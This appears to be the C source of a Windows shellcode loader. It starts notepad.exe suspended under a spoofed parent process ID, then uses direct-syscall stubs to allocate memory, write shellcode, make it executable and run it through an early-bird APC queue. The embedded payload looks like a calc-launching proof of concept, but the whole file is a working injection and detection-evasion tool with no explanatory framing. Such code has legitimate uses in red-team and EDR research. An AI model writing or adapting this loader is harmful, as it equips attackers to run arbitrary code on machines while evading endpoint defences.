#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include "bitdef_sys.h"
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T Size,
    PSIZE_T BytesWritten
    );

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PVOID Argument1,
    PVOID Argument2
    );

typedef NTSTATUS(NTAPI* pNtResumeThread)(
    HANDLE ThreadHandle,
    PULONG SuspendCount
    );

void PrintError(const char* msg) {
    printf("%s: Error Code: 0x%X\n", msg, GetLastError());
}

int main() {

    unsigned char shellcode[] = { 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29,
    0xD4, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
    0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57,
    0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE,
    0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD,
    0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
    0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF,
    0xD7 };
    SIZE_T shellcodeSize = sizeof(shellcode);

    
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = Sw3NtAllocateVirtualMemory;
    pNtProtectVirtualMemory NtProtectVirtualMemory = Sw3NtProtectVirtualMemory;
    pNtWriteVirtualMemory NtWriteVirtualMemory = Sw3NtWriteVirtualMemory;
    pNtQueueApcThread NtQueueApcThread = Sw3NtQueueApcThread;
    pNtResumeThread NtResumeThread = Sw3NtResumeThread;

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtWriteVirtualMemory || !NtQueueApcThread || !NtResumeThread) {
        PrintError("Failed to resolve NT functions");
        return -1;
    }

    // Get a handle to the parent process for PPID spoofing
    DWORD ppid = 13760; // Replace with the PID of the parent process you want to spoof
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
    if (!hParent) {
        PrintError("Failed to open parent process");
        return -1;
    }

    // Set up STARTUPINFOEX for PPID spoofing
    STARTUPINFOEXA si = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
    if (!si.lpAttributeList) {
        PrintError("Failed to allocate memory for attribute list");
        CloseHandle(hParent);
        return -1;
    }

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrListSize)) {
        PrintError("Failed to initialize attribute list");
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);
        return -1;
    }

    if (!UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent,
        sizeof(HANDLE),
        NULL,
        NULL)) {
        PrintError("Failed to update attribute list with parent process");
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);
        return -1;
    }
    

    // Create a suspended process with spoofed PPID
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe", // Replace with your target process
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &si.StartupInfo,
        &pi)) {
        PrintError("Failed to create process");
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);
        return -1;
    }

    // Free resources
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParent);

    // Allocate memory for shellcode
    PVOID remoteBuffer = NULL;
    SIZE_T size = shellcodeSize;
    NTSTATUS status = NtAllocateVirtualMemory(
        pi.hProcess,
        &remoteBuffer,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        PrintError("Failed to allocate memory in remote process");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    // Write shellcode into allocated memory
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(
        pi.hProcess,
        remoteBuffer,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );

    if (!NT_SUCCESS(status)) {
        PrintError("Failed to write shellcode into remote process");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    // Change memory protection to executable
    ULONG oldProtect = 0;
    status = NtProtectVirtualMemory(
        pi.hProcess,
        &remoteBuffer,
        &size,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (!NT_SUCCESS(status)) {
        PrintError("Failed to change memory protection");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    // Queue an APC to the main thread
    status = NtQueueApcThread(
        pi.hThread,
        remoteBuffer, // Shellcode address
        NULL,
        NULL,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        PrintError("Failed to queue APC");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    // Resume the thread using NtResumeThread
    ULONG suspendCount = 0;
    status = NtResumeThread(pi.hThread, &suspendCount);

    if (!NT_SUCCESS(status)) {
        PrintError("Failed to resume thread using NtResumeThread");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    // Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("Shellcode executed successfully with PPID spoofing!\n");
    return 0;
}
